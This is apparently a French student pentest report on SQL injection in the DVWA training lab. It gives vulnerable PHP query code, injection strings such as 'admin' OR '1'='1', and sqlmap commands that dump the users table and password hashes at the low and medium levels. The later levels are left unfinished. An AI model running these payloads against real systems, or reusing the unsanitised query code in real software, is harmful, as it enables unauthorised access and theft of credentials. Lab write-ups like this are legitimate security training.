# 1. SQL Injection

Une injection SQL (SQL Injection) est une faille de sécurité exploitée par un attaquant pour exécuter des commandes SQL malveillantes sur une base de données. Elle se produit lorsque des entrées utilisateur ne sont pas correctement validées ou filtrées avant d’être intégrées à une requête SQL. Cela peut permettre à un attaquant de manipuler les requêtes SQL de l'application, exposant ainsi des données sensibles ou compromettant le système.

Imaginons un bloc de code vulnérable tout simple :

```php
$username = $_POST['username'];
$password = $_POST['password'];

$query = "SELECT * FROM users WHERE username = '$username' AND password = '$password';";
$result = mysqli_query($conn, $query);
```

Le script ci-dessus va utiliser l'input de l'utilisateur et va le concaténer avec le reste de la commande SQL. Cependant, il n'y a aucun filtre.

Ainsi, prenons un exemple d'attaque où l'attaquant entre comme nom d'utilisateur `admin' --`  
La requête devient alors :

```sql
SELECT * FROM users WHERE username = 'admin' -- ' AND password = '';
```

La partie `-- ' AND password = '';` est commentée, et la commande restante n'est donc plus que `SELECT * FROM users WHERE username = 'admin'`. Cela accordera donc l'accès à l'utilisateur.

---

## 1.1 Premier niveau - low

On a une page avec la possibilité d'entrer un ID d'utilisateur :
![images](file://C:\Users\Sacha\Desktop\pentest_dvwa\rapport_dvwa\images\sql\1.png?msec=1736351099591)  
Cela nous renvoie l'utilisateur sans le mot de passe.

Nous essayons une simple injection :

```sql
admin' OR '1'='1
```

C'est quasiment le même exemple que cité auparavant sauf que l'on rajoute une condition `OR '1'='1` qui est toujours vraie. Cela permet d'afficher tous les utilisateurs puisque la condition est toujours satisfaite.

![images](file://C:\Users\Sacha\Desktop\pentest_dvwa\rapport_dvwa\images\sql\2.png?msec=1736351099592)

### Utilisation de sqlmap

Nous utilisons l'outil `sqlmap` pour scanner le formulaire et voir ce qu'il trouve.  
Voici une commande simple :

```bash
sqlmap -u "http://dvwa.lan/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="PHPSESSID=sdngv7nmb11ksskl0ukjj69d46; security=low"
```

On note qu'il y a le cookie de session, ce qui est important pour éviter d'être redirigé vers `login.php`.

Le résultat indique que la page est vulnérable à plusieurs types d'injections :  
![images](file://C:\Users\Sacha\Desktop\pentest_dvwa\rapport_dvwa\images\sql\3.png?msec=1736351099598)

Par exemple :

- **Boolean-based blind** : Ajoute une condition booléenne pour observer les variations de la page.
- **Error-based** : Exploite les messages d'erreur retournés par le serveur.
- **UNION query** : Concatène une requête injectée via l'opération UNION.
- **Time-based blind** : Modifie la durée d'exécution de la requête SQL.

Une commande plus avancée nous permet de récupérer davantage d'informations sur la base de données :

```bash
sqlmap -u "http://dvwa.lan/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="PHPSESSID=sdngv7nmb11ksskl0ukjj69d46; security=low" --banner --current-user --current-db --is-dba --tables --columns --dump --fresh-queries
```

Cela permet d'afficher :

- `--banner` : Version de la base de données.
- `--current-user` : Utilisateur courant.
- `--current-db` : Base de données courante.
- `--is-dba` : Si l'utilisateur est admin.
- `--tables` : Liste des tables.
- `--columns` : Liste des colonnes.
- `--dump` : Contenu des tables/colonnes.

![images](file://C:\Users\Sacha\Desktop\pentest_dvwa\rapport_dvwa\images\sql\4.png?msec=1736351099593)

En affinant avec :

```bash
sqlmap -u "http://dvwa.lan/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="PHPSESSID=sdngv7nmb11ksskl0ukjj69d46; security=low" --tables --columns --dump -T users -D dvwa
```

Nous récupérons les utilisateurs et les mots de passe hashés :

![images](file://C:\Users\Sacha\Desktop\pentest_dvwa\rapport_dvwa\images\sql\5.png?msec=1736351099594)

---

## 1.2 Deuxième niveau - medium

La principale différence est que la requête est en `POST` et non dans l'URL.

Nous combinons l'utilisation de `Burp Suite` et `sqlmap` :

1. Intercepter la requête avec Burp Suite :
   ![images](file://C:\Users\Sacha\Desktop\pentest_dvwa\rapport_dvwa\images\sql\6.png?msec=1736351099595)

2. Sauvegarder la requête dans un fichier texte (`info.txt`).

3. Utiliser `sqlmap` avec la commande :

```bash
sqlmap -r info.txt -p id
```

![images](file://C:\Users\Sacha\Desktop\pentest_dvwa\rapport_dvwa\images\sql\7.png?msec=1736351099595)

En affinant avec :

```bash
sqlmap -r info.txt -p id --tables --columns --dump -T users -D dvwa
```

Nous récupérons à nouveau les identifiants :
![images](file://C:\Users\Sacha\Desktop\pentest_dvwa\rapport_dvwa\images\sql\8.png?msec=1736351099596)

### Analyse du code PHP

```php
<?php

if( isset( $_POST[ 'Submit' ] ) ) {
    // Get input
    $id = $_POST[ 'id' ];

    $id = mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $id);

    $query  = "SELECT first_name, last_name FROM users WHERE user_id = $id;";
    $result = mysqli_query($GLOBALS["___mysqli_ston"], $query) or die( '<pre>' . mysqli_error($GLOBALS["___mysqli_ston"]) . '</pre>' );

    while( $row = mysqli_fetch_assoc( $result ) ) {
        // Display values
        $first = $row["first_name"];
        $last  = $row["last_name"];

        echo "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";
    }
}
?>
```

**Progrès** : Utilisation de `mysqli_real_escape_string()` pour limiter les injections basiques, mais la requête reste vulnérable en raison de l'injection possible avec des entiers ou des types inattendus.

---

## 1.3 Troisième niveau - hard

(À compléter)

---

## 1.4 Niveau impossible

(À compléter)
